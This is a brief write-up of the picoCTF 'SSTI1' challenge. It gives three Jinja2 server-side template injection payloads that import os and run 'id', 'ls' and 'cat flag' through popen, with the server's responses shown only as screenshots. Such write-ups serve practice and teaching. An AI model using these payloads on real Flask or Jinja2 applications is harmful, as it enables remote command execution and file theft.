# SSTI1 

[Challenge](https://play.picoctf.org/practice/challenge/492?category=1&originalEvent=74&page=1)



<img width="963" alt="Screenshot 2025-05-03 at 3 42 12 PM" src="https://github.com/user-attachments/assets/75a9624f-58b8-4881-ab06-93764d64db02" />

---

use this payload: ```{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}```

response:

<img width="1217" alt="Screenshot 2025-05-03 at 3 42 21 PM" src="https://github.com/user-attachments/assets/01d50c53-ac9b-40c0-a7bd-fee74f8a2865" />

---

```{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}```

response:

<img width="1245" alt="Screenshot 2025-05-03 at 3 42 42 PM" src="https://github.com/user-attachments/assets/99e3eab9-c92d-41a2-85d9-b3e35fdabe62" />

---

{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}

response:

<img width="1256" alt="Screenshot 2025-05-03 at 3 43 05 PM" src="https://github.com/user-attachments/assets/8f57f873-4d13-457d-8fbc-1f1451c714e1" />

---
